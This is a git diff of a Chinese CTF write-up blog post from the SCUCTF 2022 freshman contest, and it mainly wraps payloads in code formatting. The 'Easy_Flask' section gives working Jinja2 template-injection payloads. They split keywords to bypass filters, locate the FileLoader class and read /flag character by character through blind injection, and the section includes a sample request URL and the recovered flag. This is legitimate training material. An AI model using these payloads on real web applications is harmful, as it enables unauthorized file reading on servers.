@@ -1,5 +1,5 @@
 ---
-title: Writeup for SCUCTF新生赛-2022
+title: Writeup for SCUCTF新生赛
 date: 2022-11-13 09:25:00
 author: 美食家李老叭
 img: https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221113134336.png
@@ -1271,18 +1271,18 @@ php语言 对sha1的验证存在漏洞，改成数组则可 均为false。`http:
 ### 8. Easy_Flask
 
 构造payload
-{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].__name__) == 'FileLoader' %}1{% endif %}
+`{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].__name__) == 'FileLoader' %}1{% endif %}`
 遍历%d
-pay_load = "{%" + "if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[%d].__name__)" %i + "%}" + "1" + "{%" +  "endif" + "%}"
+`pay_load = "{%" + "if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[%d].__name__)" %i + "%}" + "1" + "{%" +  "endif" + "%}"`
 得出 d=118时，返回了OK 。可以利用FileLoader
 
 利用FileLoader里面的getdata
-{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[0]) %}1{% endif %}
+`{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[0]) %}1{% endif %}`
 
 遍历128个字符 盲注 测试 如果输出了ok，则拼接到flag字符串中，遍历50次，得到最终flag
-pay_load = "{%" + "if '%s' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])" % (str1, i) + "%}" + "1" + "{%" + "endif" + "%}"
+`pay_load = "{%" + "if '%s' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])" % (str1, i) + "%}" + "1" + "{%" + "endif" + "%}"`
 
-例如：http://114.117.187.56:11003/view?name={%if '5' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[28])%}1{%endif%}
+`例如：http://114.117.187.56:11003/view?name={%if '5' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[28])%}1{%endif%}`
 Ok
 
 scuctf{1eb75f13ba362c3c90030585a85435f4}。
